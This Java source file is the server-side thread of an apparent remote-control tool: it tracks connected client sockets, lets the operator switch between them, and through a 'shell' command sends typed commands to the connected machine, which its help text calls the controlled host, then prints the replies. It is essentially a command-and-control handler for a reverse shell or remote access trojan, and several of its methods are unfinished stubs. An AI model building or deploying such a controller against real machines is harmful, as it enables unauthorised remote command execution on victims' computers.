package com.haozai.server;

import java.io.*;
import java.net.Socket;
import java.util.*;

/**
 * @author jackliu  Email:
 * @description: 单独处理和每个客户端通信的线程
 * @Version
 * @create 2023-07-17 10:52
 */
public class ServerThread extends Thread {

    public static final String reset = "\u001B[0m";  // 重置所有属性
    public static final String white = "\u001B[30m"; // 白色字体
    public static final String red = "\u001B[31m";   // 红色字体
    public static final String yellow = "\u001B[32m"; // 黄色字体
    public static final String blue = "\u001B[34m";  // 蓝色字体
    public static final String purple = "\u001B[35m";// 紫色字体
    public static final String cyan = "\u001B[36m";  // 青色字体

    //存放客户端的socket
    public static List<Socket> socketList = new ArrayList<>(5);


    //1 --- Thread
    //2 --- Thread
    //一个数字代表一个socket也就代表一个Thread，需要指定哪个，直接唤醒响应的线程
    public static Map<Integer,Object> socketMapName  = new HashMap<>(5);
    private  Socket clientSocket;

    public ServerThread(Socket socket){
        this.clientSocket = socket;
    }


    //获取socketList中指定value的下表

    @Override
    public void run() {

        //添加客户端连接
        //当前线程放到第一个就是0

        socketList.add(clientSocket);
        //添加映射
        socketMapName.put(socketList.indexOf(clientSocket),Thread.currentThread());

        synchronized (this) {
            try {
                wait();
            } catch (InterruptedException e) {
//                e.printStackTrace();
                System.out.println(cyan + "切换成功");
            }
        }

        Scanner scanner = new Scanner(System.in);

        //
        System.out.println( cyan + "连接成功");
        while (true){
            System.out.print(clientSocket.getInetAddress().toString().replace("/","")+">>>");
            String cmd = scanner.nextLine();
            if ("exit".equals(cmd)){
                synchronized (this) {
                    try {
                        //唤醒主线程
                        Thread sc  = (Thread) socketMapName.get(0);
                        sc.interrupt();
                        wait();
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }

                break;
            }
            try {
                menu(cmd);
            } catch (IOException e) {
                e.printStackTrace();
            }

        }

    }

    public  void menu(String select) throws IOException {

        select = select.trim();
        switch (select){
            case "help":
                showHelp();
                break;
            case "exit":
                exitPro();
                break;
            case "shell":
                osCmdShell();
                break;
            default:
                coding();
        }

    }

    private  void osCmdShell() throws IOException {
        Scanner scanner = new Scanner(System.in);

        //用于接收客户端的消息
        InputStream inputStream = clientSocket.getInputStream();

        //用于向客户端端发送消息
        OutputStream outputStream = clientSocket.getOutputStream();
        DataOutputStream dataOutputStream = new DataOutputStream(outputStream);

        while (true){
            System.out.print(clientSocket.getInetAddress().toString().replace("/","")+"-shell>>>");
            String cmd = scanner.nextLine();

            //退出关闭流
            if ("back".equals(cmd) || "exit".equals(cmd)){
                if (dataOutputStream != null && outputStream != null){
                    try {
                        dataOutputStream.close();
                        outputStream.close();
                    }catch (Exception e){
                        System.out.println(red + "error :" + e.getMessage());
                    }
                }
                break;
            }

            //发送消息
            dataOutputStream.writeUTF(cmd);
            //发送成功
            System.out.println("发送成功");

            //接收消息
            DataInputStream dataInputStream = new DataInputStream(inputStream);
            String resInfo = dataInputStream.readUTF();
            System.out.println(blue+resInfo+reset);
            System.out.println("接收完成");
            System.out.println();
        }
    }



    private  void coding() {

        System.out.println(red + "sorry ! 正在努力开发中......" + reset);
    }

    private  void exitPro() {

    }

    private  void showHelp() {

        System.out.println(blue+ "=========help==========="  );

        System.out.println("    shell 进入到被控主机，使用被控主机的命令行执行命令" + reset );
    }
}
